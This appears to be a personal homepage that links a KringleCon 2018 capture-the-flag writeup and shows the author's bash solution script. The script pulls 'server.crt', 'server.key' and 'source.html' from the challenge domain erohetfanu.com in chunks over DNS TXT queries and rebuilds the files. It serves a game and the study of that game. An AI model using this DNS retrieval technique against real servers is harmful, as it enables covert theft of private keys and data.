## KringleCon

Looking for my KringleCon 2018 writeup? [Et voila!](files/CraHan%20-%20KringleCon%202018%20writeup.pdf)

```bash
#!/bin/bash

files=('server.crt' 'server.key' 'source.html')

for file in "${files[@]}" 
do
    # Convert filename to hex
    fnhex=$(xxd -pu <<< $file)

    # Strip the linefeed
    fnhex=${fnhex::-2}

    # DNS query requesting number of chunks
    chunks=$(host -t txt ${fnhex}.erohetfanu.com erohetfanu.com | \ 
    sed -n 's/.*\"\([0-9]*\)\".*/\1/p')

    # Check if value was returned
    if [ $chunks > 0 ]
    then
        echo "${file} found (${chunks} chunks)."

        if [ "$1" != "recon" ]
        then
            # Grab the file and save it to ${file}.hex
            echo -n "Grabbing chunk: "
            chunks=$(expr $chunks - 1)

            for chunk in $(eval echo "{0..$chunks}")
            do
                remainder=$(( chunk % 100 ))
                [ "$remainder" -eq 0 ] && echo -n "${chunk}..."

                host -t txt ${chunk}.${fnhex}.erohetfanu.com erohetfanu.com | \
                sed -n 's/.*\"\(.*\)\".*/\1/p' >> "${file}.hex"
            done

            printf "done.\n\n"
            
            # remove \n
            cat ${file}.hex | tr -d '\n' > ${file}-clean.hex

            # convert back to binary
            xxd -r -p ${file}-clean.hex ${file}
        fi
    else
        echo "${file} not found."
    fi
done
```

## Random

> Folks that throw dirt on you aren't always trying to hurt you, and folks that pull you out of a jam aren't always trying to help you. But the main point is when you're up to your nose in shit, keep your mouth shut.
> 
> -- <cite>Jack Beauregard</cite>

## Elsewhere

- [Twitter](https://www.twitter.com/crahan)
- [Instagram](https://instagram.com/crahan)
- [Github](https://github.com/crahan)
- [Pinboard](https://pinboard.in/u:crahan)
